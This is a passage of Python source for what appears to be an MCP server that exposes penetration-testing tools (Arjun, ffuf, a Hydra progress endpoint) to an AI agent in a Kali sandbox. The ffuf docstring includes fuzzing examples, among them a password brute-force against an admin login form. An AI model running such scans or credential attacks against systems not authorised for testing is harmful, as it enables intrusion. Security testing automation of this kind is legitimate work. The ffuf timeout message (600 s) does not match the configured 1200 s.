            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line.strip() and not line.strip().startswith('[*]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        # Arjun writes JSON results to file (not stdout). Auto-read if -oJ was used.
        for i, arg in enumerate(cmd_args):
            if arg == '-oJ' and i + 1 < len(cmd_args):
                json_path = cmd_args[i + 1]
                try:
                    with open(json_path, 'r') as f:
                        json_content = f.read().strip()
                    if json_content:
                        output += f"\n\n[JSON RESULTS]:\n{json_content}"
                except FileNotFoundError:
                    output += "\n[INFO] No JSON output file generated (no parameters found)"
                except Exception as e:
                    output += f"\n[WARN] Could not read JSON output: {e}"
                break

        return output.strip() if output.strip() else "[INFO] No parameters discovered."

    except subprocess.TimeoutExpired:
        return "[ERROR] Arjun timed out after 300 seconds. Try fewer URLs or use --rate-limit."
    except FileNotFoundError:
        return "[ERROR] arjun not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_ffuf(args: str) -> str:
    """
    Execute FFuf web fuzzer with any valid CLI arguments.

    FFuf (Fuzz Faster U Fool) is a fast web fuzzer for discovering hidden
    directories, files, virtual hosts, and parameters. Place the FUZZ keyword
    at the mutation point in the URL, header, or request body.

    Pre-installed wordlists at /usr/share/seclists/Discovery/Web-Content/:
      - common.txt      (4750 entries  -- standard discovery, start here)
      - big.txt         (20481 entries -- comprehensive)
      - raft-medium-directories.txt (29999 entries -- raft-based)

    Args:
        args: Command-line arguments for ffuf (without the 'ffuf' command itself).
              The FUZZ keyword must appear at the injection point.

    Returns:
        Fuzzing results as text output, or JSON when -of json -o <file> is used.

    Examples:
        Directory fuzzing:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.5/FUZZ -mc 200,204,301,302,307,401,403 -ac -t 40 -rate 200 -noninteractive"

        Virtual host fuzzing:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.5 -H 'Host: FUZZ.target.tld' -fs 0 -ac -noninteractive"

        Parameter value fuzzing:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.0.5/search?q=FUZZ' -mc all -fs 0 -ac -t 30 -noninteractive"

        POST body fuzzing:
        - "-w payloads.txt -u http://10.0.0.5/login -X POST -d 'username=admin&password=FUZZ' -fc 401 -noninteractive"

        With file extensions:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.5/FUZZ -e .php,.bak,.old -mc 200,301,302,403 -ac -noninteractive"

        Save JSON output:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.5/FUZZ -mc 200,301,302,403 -ac -noninteractive -of json -o /tmp/ffuf_results.json"

        Recursive discovery:
        - "-w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.5/FUZZ -recursion -recursion-depth 2 -ac -t 30 -noninteractive"
    """
    try:
        cmd_args = shlex.split(args)

        # Auto-inject -noninteractive to prevent interactive console mode
        if '-noninteractive' not in cmd_args:
            cmd_args.append('-noninteractive')

        result = subprocess.run(
            ["ffuf"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=1200
        )

        output = ""
        if result.stdout:
            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line.strip()
                and not line.strip().startswith(':: ')
                and 'progress:' not in line.lower()
                and 'job #' not in line.lower()
                and '___' not in line
                and '\\/' not in line
                and '/\\' not in line
                and line.strip() not in ('', '_' * 48)
                and not line.strip().startswith('v2.')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        if not output.strip():
            return "[INFO] No results found matching the specified filters."

        return output

    except subprocess.TimeoutExpired:
        return "[ERROR] FFuf timed out after 600 seconds. Consider narrowing scope with -mc/-fc/-fs filters or a smaller wordlist."
    except FileNotFoundError:
        return "[ERROR] ffuf not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


class HydraProgressHandler(BaseHTTPRequestHandler):
    """HTTP handler for Hydra progress endpoint."""

    def do_GET(self):
        if self.path == '/progress':
            try:
                progress = get_hydra_progress()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(progress).encode())
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Suppress request logging."""
        pass


def start_hydra_progress_server(port: int = HYDRA_PROGRESS_PORT):
    """Start HTTP server for Hydra progress endpoint in a background thread."""
    server = HTTPServer(('0.0.0.0', port), HydraProgressHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[HYDRA] Progress server started on port {port}")
    return server


if __name__ == "__main__":
    import sys

    # Check transport mode from environment
    transport = os.getenv("MCP_TRANSPORT", "stdio")

    if transport == "sse":
        start_hydra_progress_server(HYDRA_PROGRESS_PORT)
        mcp.run(transport="sse", host=SERVER_HOST, port=SERVER_PORT)
    else:
        mcp.run(transport="stdio")
